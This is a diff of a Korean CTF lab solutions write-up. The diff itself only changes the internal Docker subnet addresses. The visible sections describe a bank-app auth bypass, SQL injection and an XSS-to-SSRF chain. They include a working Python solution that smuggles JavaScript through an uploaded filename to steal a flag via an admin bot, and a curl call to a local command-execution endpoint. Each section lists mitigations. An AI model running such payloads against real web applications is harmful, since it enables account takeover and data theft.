@@ -249,7 +249,7 @@ curl -s "http://localhost:9711/sys/exec-9f3a?key=Zx9_d3c0mp1l3_th1s_k3y_2026&cmd
 
 > 각자 own docker-compose. `start.ps1` 기본 기동(또는 `setup_external.ps1` 후 각 폴더 `docker compose up`).
 > 풀이는 소스(`challenges/auth/authbypass-*/app/app.py`, `challenges/capstone/secret-tunnel/src/`) 분석 기반.
-> FSI 채팅(`fsi-chat-sqli`/`fsi-chat-xss`, :9090)은 `setup_external` 가 `challenges/capstone/fsi-chat/` 로 클론하며, `start.ps1 -WithFsi`(셸: `--with-fsi`)로 기동(172.22.0.0/24 고정 대역).
+> FSI 채팅(`fsi-chat-sqli`/`fsi-chat-xss`, :9090)은 `setup_external` 가 `challenges/capstone/fsi-chat/` 로 클론하며, `start.ps1 -WithFsi`(셸: `--with-fsi`)로 기동(10.111.0.0/24 고정 대역).
 
 ### authbypass-basic (:9001) — 은행 인증우회 (간편비밀번호 등록 결함)  ✓ 실익스플로잇 검증됨
 - **취약점**: `register_simplepass` 가 **폼의 `userid`** 로 간편비밀번호를 등록(세션 사용자 아님) → admin 의 간편비번을 공격자가 설정 가능. `/getflag` 는 잔액>10억일 때 flag(admin 잔액은 천문학적).
@@ -352,9 +352,9 @@ print(re.search(r"fsi2022\{[^}]*\}", r.text).group(0))   # → fsi2022{yes_y0u_c
 - **대응**: 모든 사용자입력에 동일 필터/파라미터 바인딩 적용 · `load_file` 결과를 에러 메시지로 반환 금지 · `secure-file-priv` 와 DB 계정 `FILE` 권한 최소화.
 
 ### fsi-chat-xss (:9090) — FSI 채팅 XSS → SSRF → 내부보드 flag 탈취  ✓ 체인 검증됨(봇 클릭만 버전부패)
-- **구성**: `external`(172.22.0.3, 공개보드) · `internal`(172.22.0.4: **author 검사 없는** 내부보드 `int/app.py` + **admin 봇** `bot.py`) · db 공유. 봇은 egress 방화벽(`OUTPUT DROP`)으로 172.22.0.3/172.22.0.5 만 통신 → 외부 리스너 탈취 불가, **공유 DB 경유**가 정공법.
+- **구성**: `external`(10.111.0.3, 공개보드) · `internal`(10.111.0.4: **author 검사 없는** 내부보드 `int/app.py` + **admin 봇** `bot.py`) · db 공유. 봇은 egress 방화벽(`OUTPUT DROP`)으로 10.111.0.3/10.111.0.5 만 통신 → 외부 리스너 탈취 불가, **공유 DB 경유**가 정공법.
 - **취약점**: `view.html` 의 `<a href="javascript:fileDown('{{filepath}}')" id="uploadFile">`. Jinja 가 `'→&#39;` 로 이스케이프하지만 **`javascript:` URI 는 브라우저가 HTML 디코드 후 JS 실행**하므로 `&#39;` 가 다시 `'` 가 되어 문자열 탈출이 가능. `safeQuery` 는 `' ( ) ;` 를 막지 않으므로 **파일명(=filepath)에 JS 를 심으면** 봇이 `uploadFile` 클릭 시 admin 컨텍스트에서 실행된다. 내부보드 `getBoardView` 는 `where seq="..."`(author 검사 없음) → admin 봇이 `/board/1`(flag 글) 을 열람 가능.
-- **체인**: ① 공개보드에 *빈 파일*을 올리되 **파일명을 페이로드**로(→`board.filepath`) ② `/report` 로 내부보드 뷰 `http://172.22.0.4:9090/board/<myseq>` 신고 ③ admin 봇 클릭 → `XHR GET /board/1` 로 flag 읽고 → 내부 `/write` 로 **제목=flag, author=admin** 새 글 작성 ④ 공격자는 공개보드 목록에서 회수(`getBoardList` 가 `... or author="admin"` → admin 글 *제목*(=flag)이 내 목록에 노출).
+- **체인**: ① 공개보드에 *빈 파일*을 올리되 **파일명을 페이로드**로(→`board.filepath`) ② `/report` 로 내부보드 뷰 `http://10.111.0.4:9090/board/<myseq>` 신고 ③ admin 봇 클릭 → `XHR GET /board/1` 로 flag 읽고 → 내부 `/write` 로 **제목=flag, author=admin** 새 글 작성 ④ 공격자는 공개보드 목록에서 회수(`getBoardList` 가 `... or author="admin"` → admin 글 *제목*(=flag)이 내 목록에 노출).
 - **풀이(파이썬, 공격자측)** — `solution/fsi_xss.py`. 봇이 클릭으로 실행할 JS 는 `safeQuery` 금지문자와 *리터럴 `/`* 를 모두 회피(`'/'`=`fromCharCode(47)`, 본문=`FormData` 라 `&` 불필요):
 ```python
 JS=("var s=String.fromCharCode(47);"
@@ -364,7 +364,7 @@ JS=("var s=String.fromCharCode(47);"
     "var w=new XMLHttpRequest();w.open('POST',s+'write',false);w.send(fd);")        # 공유 DB 로 exfil
 filename="');"+JS+"v=('"        # fileDown('<filename>') 탈출 → fileDown('');JS;v=('')
 # s.post('/write', data={'subject':m,'author':uid,'content':'x'}, files={'file':(filename, b'')})
-# s.post('/report', data={'url':'http://172.22.0.4:9090/board/<myseq>'})  → 목록에서 fsi2022{...} 회수
+# s.post('/report', data={'url':'http://10.111.0.4:9090/board/<myseq>'})  → 목록에서 fsi2022{...} 회수
 ```
 - **검증**: payload 가 `safeQuery` 무손상 통과 + 내부 `/board/<seq>` 의 href 에 그대로 렌더됨(확인), admin 세션이 `/board/1` flag 열람(확인 → `fsi2022{n0w_you_4re_g00d_at_xss_m4ybe?}`), 공유보드 경유 회수(확인). 단 **봇의 literal chromium 클릭**은 봇 이미지의 *Selenium 3.141 + 2022 chrome ↔ 2026 chrome* 버전부패로 막힐 수 있음(“chrome not reachable”). 복구: `bot.py` 에 `--headless=new`·`--remote-allow-origins=*`·`--disable-dev-shm-usage` 추가 + chromedriver 를 설치된 chrome 버전에 맞춰 교체, 근본적으론 int 이미지를 python3.8+/selenium4 로 갱신.
 - **대응**: `javascript:` 싱크 제거(href 에 사용자입력 금지)·출력 인코딩 · `safeQuery` 에 `' ( )` 포함 · 내부보드 `getBoardView` 인가검사 · 봇 egress 제한 + CSP.
